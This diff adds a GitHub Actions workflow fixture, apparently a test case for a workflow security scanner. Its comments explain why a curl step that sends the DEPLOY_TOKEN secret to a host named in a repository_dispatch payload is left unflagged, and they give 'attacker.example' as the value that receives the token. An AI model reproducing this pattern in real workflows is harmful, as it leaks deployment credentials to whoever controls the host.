@@ -1,0 +1,24 @@
+# situation: on repository_dispatch, the curl command of a step names its
+#   host by the value title of the client_payload, and sends the secret
+#   DEPLOY_TOKEN in an Authorization header.
+# reason: the form adds nothing to what the attacker gets (the disposition
+#   no-added-gain): only a credential with write access to the permission
+#   Contents of the repository can send repository_dispatch, and the
+#   credential premise assumes that no attacker holds such a credential; the
+#   sender chooses the whole client_payload.
+# cause: the table of the attacker's events that the rule reads leaves out
+#   repository_dispatch on purpose: the credential premise leaves the sender
+#   of repository_dispatch out of the threat model.
+# attack-value: github.event.client_payload.title = "attacker.example"
+# attack-run-behavior: when a repository_dispatch with the value in its
+#   client_payload runs the workflow, curl sends GET /status to
+#   attacker.example with Authorization: Bearer and the value of DEPLOY_TOKEN.
+on: repository_dispatch
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+    steps:
+      - run: |
+          curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://${{ github.event.client_payload.title }}/status"
